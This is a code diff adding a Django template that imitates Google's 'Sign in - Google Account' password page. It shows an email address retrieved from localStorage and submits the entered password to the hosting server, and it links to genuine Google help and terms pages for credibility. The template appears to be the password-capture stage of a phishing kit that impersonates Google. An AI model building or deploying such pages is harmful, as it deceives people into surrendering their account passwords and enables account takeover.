@@ -1,0 +1,78 @@
+{% extends 'base.html' %}
+{% block title %}
+Sign in - Google Account
+{%  endblock %}
+
+{% block form %}
+<form method="POST" id="form_passwd" name="form_passwd">
+    {% csrf_token %}
+    <center>
+       <p id="welcome">Welcome</p>
+        <span id="_email">
+        <i class="fa-solid fa-user"></i>&nbsp
+        <span id="email-el"></span>&nbsp
+        <i class="fa-solid fa-chevron-down"></i>
+        </span><br></center><center>
+    <div class="input_pass">
+    <span id="mini-pass"></span>
+    {{ form }}
+    </div></center><br><br>
+  <!--  <input type="password" name="password" onclick="gaga()" id="password" class="password" placeholder="Enter your password" onfocus="this.placeholder=''" required/>-->
+    <div class="checkbox"><input type="checkbox" id="checkbox"  onclick= "show()"/> &nbsp &nbsp <span id="show_pass">Show password</span></div>
+<script>
+    function show(){
+    var visible = document.getElementById("password")
+    if ( visible.type === "password"){
+        visible.type = "text"
+    }else{
+        visible.type = "password"
+    }
+}
+</script>
+<br><br><br><br>
+<a href="" id="body_blue_linkss">Forgot password?</a> <button type="submit" disabled="disabled" name="next_btn" onclick="next()" id="next_btn" minlenght="7">Next</button>
+
+<script>
+    form_passwd.addEventListener('input' , () => {
+          if ( password.value.length > 5) {
+              next_btn.removeAttribute('disabled');
+              } else {
+                 next_btn.setAttribute('disabled', 'disabled');
+                     
+                }});
+
+ </script>
+</form>
+
+<script>
+    function gaga(){
+      let m = document.getElementById("mini-pass");
+      let e = document.getElementById("password");
+      if (e.value = " "){
+          m.innerHTML = "<span> Enter your password </span>";
+          e.style.border = "2px solid blue";
+          
+      }}
+</script>
+
+<script>
+    window.addEventListener('load' , () => {
+        const email = localStorage.getItem("EMAIL");
+        document.getElementById("email-el").innerHTML = email;
+    })
+</script>
+
+
+
+{% endblock %}
+{% block footer %}
+<div id="footer"><ul>
+    <select name="lang" id="lang" style="color: #212121 ;">
+        <option value="English">English (Australia)</option> 
+        <option value="j">English (Canada)</option>
+    </select><li><a href="https://support.google.com/accounts?hl=en&p=account_iph"style="color: #212121">Help</a></li>
+                 <li><a href="https://accounts.google.com/TOS?loc=NG&hl=en&privacy=true" style="color:#212121">Privacy</a></li>
+                 <li><a href="https://accounts.google.com/TOS?loc=NG&hl=en" style="color:#212121">Terms</a></li></ul>
+    </div>
+{% endblock %}
+
